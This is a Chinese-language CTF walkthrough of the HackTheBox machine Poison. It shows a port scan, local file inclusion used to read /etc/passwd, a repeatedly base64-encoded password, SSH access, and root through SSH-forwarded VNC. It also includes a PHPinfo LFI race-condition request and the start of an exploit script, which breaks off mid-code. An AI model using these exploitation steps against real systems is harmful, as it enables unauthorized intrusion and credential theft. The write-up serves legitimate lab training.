### 扫描端口
开放了80、20端口
    nmap -sV -sC -sT -v 10.10.10.84 
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
    | ssh-hostkey: 
    |   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
    |   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
    |_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
    Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd
### 文件包含
打开80看到有几个php文件，我们输入提交以后就可以包含这些文件了。
发现base64加密字符串
    This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=
最后解密得到Charix!2#4%6&8(0
可以跨越目录访问到etc/passwd文件
    # $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $
    #
    root:*:0:0:Charlie &:/root:/bin/csh
    toor:*:0:0:Bourne-again Superuser:/root:
    daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
    operator:*:2:5:System &:/:/usr/sbin/nologin
    bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
    tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
    kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
    games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin
    news:*:8:8:News Subsystem:/:/usr/sbin/nologin
    man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
    sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
    smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
    mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
    bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
    unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin
    proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
    _pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
    _dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
    uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
    pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
    auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin
    www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
    _ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin
    hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
    nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
    _tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin
    messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin
    avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin
    cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin
    charix:*:1001:1001:charix:/home/charix:/bin/csh
### 登陆ssh
ssh PI:EMAIL/Charix!2#4%6&8(0
在目录下直接查看user.txt拿到第一个flag
    charix@Poison:~ % ls
    secret.zip  user.txt
把secret.zip下载到本地，发现需要密码解密，我们使用base64解出来的密码，成功解密出文件secret。
    $ scp -P 22  PI:EMAIL:secret.zip /home/Rogerd/
    $ unzip secret.zip                                 
    Archive:  secret.zip
    [secret.zip] secret password: 
     extracting: secret
查看端口信息发现，本地监听了5801和5809，这两个应该是VNC
查看root进程信息发现Xvnc
    charix@Poison:~ % netstat -an
    Active Internet connections (including servers)
    Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
    tcp4       0     44 10.10.10.84.22         10.10.14.4.46676       ESTABLISHED
    tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
    tcp4       0      0 *.80                   *.*                    LISTEN
    tcp6       0      0 *.80                   *.*                    LISTEN
    tcp4       0      0 *.22                   *.*                    LISTEN
    tcp6       0      0 *.22                   *.*                    LISTEN
    tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
    tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
    udp4       0      0 *.514                  *.*                    
    udp6       0      0 *.514                  *.*                
    charix@Poison:~ % ps -U root
     PID TT  STAT      TIME COMMAND
       0  -  DLs    0:00.07 [kernel]
       1  -  ILs    0:00.04 /sbin/init --       2  -  DL     0:00.00 [crypto]
       3  -  DL     0:00.00 [crypto returns]
       4  -  DL     0:00.73 [cam]
       5  -  DL     0:00.00 [mpt_recovery0]
       6  -  DL     0:00.00 [sctp_iterator]
       7  -  DL     0:14.16 [rand_harvestq]
     319  -  Ss     0:02.01 /sbin/devd
     390  -  Ss     0:00.67 /usr/sbin/syslogd -s
     543  -  S      0:21.93 /usr/local/bin/vmtoolsd -c /usr/local/share/vmware-tools/tools.conf -p /usr
     620  -  Is     0:00.01 /usr/sbin/sshd
     625  -  Rs     0:00.92 /usr/local/sbin/httpd -DNOHTTPACCEPT
     642  -  Ss     0:00.55 sendmail: accepting connections (sendmail)
     649  -  Ss     0:00.11 /usr/sbin/cron -s
    2133  -  Is     0:00.02 sshd: charix [priv] (sshd)
    2141  -  S      0:00.00 sendmail: ./x4D68p98001750 from queue (sendmail)
     529 v0- I      0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xa
     540 v0- I      0:00.02 xterm -geometry 80x24+10+10 -ls -title X Desktop
### vnc渗透
VNC是一个GUI程序。由于只有SSH访问机器，因此无法从远程shell启动VNC会话;
没有用于生成VNC会话的弹出窗口。我们也无法远程连接到VNC会话，只能通过转发到本地再使用vncviewer链接。
使用ssh转发VNC端口
ssh -L 5901:127.0.0.1:5901 PI:EMAIL
最后使用vncviewer访问VNC拿到flag
vncviewer -passwd secret 127.0.0.1:5901
### 扩展：LFI getshell
#### phpinfo lfi getshell
当存在一个文件包含的时候，同时有phpinfo页面。
可以利用phpinfo页面，找到上传的tmp文件，进行条件竞争，生成想要获得shell
构造一个post请求到phpinfo.php
    POST /phpinfo.php HTTP/1.1
    Host: 10.10.10.84
    User-Agent: Hello
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    DNT: 1
    Connection: close
    Upgrade-Insecure-Requests: 1
    Content-Type: multipart/form-data; boundary=--ShellHere
    Content-Length: 147
    ----ShellHere
    Content-Disposition: form-data; name="anything"; filename="Shell"
    Content-Type: text/plain
    Get the shell here
    ----ShellHere
在上传文件的时候，php都会将这个文件保存成一个临时文件，默认为tmp/php{6}，因为phpinfo可以找到上传的临时文件名。我们利用条件竞争，在php销毁前利用lfi包含临时文件
当我们获取到临时文件名时，就立即发送文件包含请求  
当整个phpinfo被垃圾信息充斥时，就有足够的时间给我们进行文件包含，从而生成shell。
phpinfolfi.py脚本：
    #!/usr/bin/python
    # https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf
    import sys
    import threading
    import socket
    def setup(host, port):
        TAG="Security Test"
        PAYLOAD="""%s\r
    \r""" % TAG
        REQ1_DATA="""-----------------------------7dbff1ded0714\r
    Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
    Content-Type: text/plain\r
    \r
    %s
    -----------------------------7dbff1ded0714--\r""" % PAYLOAD
        padding="A" * 5000
        REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
    Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
    HTTP_ACCEPT: """ + padding + """\r
    HTTP_USER_AGENT: """+padding+"""\r
    HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
    HTTP_PRAGMA: """+padding+"""\r
    Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
    Content-Length: %s\r
    Host: %s\r
    \r
    %s""" %(len(REQ1_DATA),host,REQ1_DATA)
        #modify this to suit the LFI script
        LFIREQ="""GET /browse.php?file=%s HTTP/1.1\r
    User-Agent: Mozilla/4.0\r